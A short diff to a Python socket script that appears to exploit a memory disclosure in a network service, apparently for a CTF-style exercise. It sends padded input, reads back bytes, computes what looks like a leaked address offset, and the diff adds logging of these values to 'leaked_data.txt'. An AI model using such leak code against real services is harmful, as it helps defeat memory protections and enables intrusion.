@@ -18,6 +18,8 @@ except socket.error as msg:
 
 try:
 
+    fo = open("leaked_data.txt", "a")
+
     # Send data
     message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
     print('sending {!r}'.format(message))
@@ -30,6 +32,7 @@ try:
         data = sock.recv(32)
         amount_received += len(data)
         print("0x" + data.hex()[48:])
+        fo.write("0x" + data.hex()[48:])
 
     # Send data
     message = b'\n6\n'
@@ -42,7 +45,9 @@ try:
         data = sock.recv(6)
         amount_received += len(data)
         print(hex(int.from_bytes(data,"little")-224))
+        fo.write(" " + hex(int.from_bytes(data,"little")-224))
 
 finally:
     print('closing socket')
+    fo.close()
     sock.close()
